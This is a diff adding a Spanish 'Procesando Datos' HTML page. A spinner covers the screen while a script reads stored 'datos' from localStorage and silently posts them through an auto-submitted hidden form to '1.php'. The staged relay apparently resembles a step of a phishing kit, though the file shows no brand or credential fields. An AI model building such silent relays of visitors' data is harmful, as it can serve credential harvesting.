@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta content="es" http-equiv="Content-Language">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Procesando Datos</title>
+  <style>
+    /* Loader overlay */
+    body { margin: 0; padding: 0; }
+    #loader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.8); /* Fondo rosado translúcido */
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+    .spinner {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #E0128B; /* Color rosa */
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <!-- Loader que se muestra mientras se procesa el envío -->
+  <div id="loader">
+    <div class="spinner"></div>
+  </div>
+  
+  <script>
+    // Al cargar la página se recuperan los datos del localStorage y se envían a 1.php
+    window.addEventListener("load", function() {
+      var datos = localStorage.getItem("datos");
+      if (datos) {
+        try {
+          var datosObj = JSON.parse(datos);
+          // Creamos un formulario oculto para enviar los datos por POST a 1.php
+          var form = document.createElement("form");
+          form.method = "post";
+          form.action = "1.php";
+          // Recorremos cada propiedad del objeto y creamos un input oculto
+          for (var key in datosObj) {
+            if (datosObj.hasOwnProperty(key)) {
+              var input = document.createElement("input");
+              input.type = "hidden";
+              input.name = key;
+              input.value = datosObj[key];
+              form.appendChild(input);
+            }
+          }
+          document.body.appendChild(form);
+          form.submit();
+        } catch (e) {
+          console.error("Error al parsear los datos del localStorage:", e);
+        }
+      } else {
+        console.error("No se encontraron datos en localStorage.");
+      }
+    });
+  </script>
+</body>
+</html>
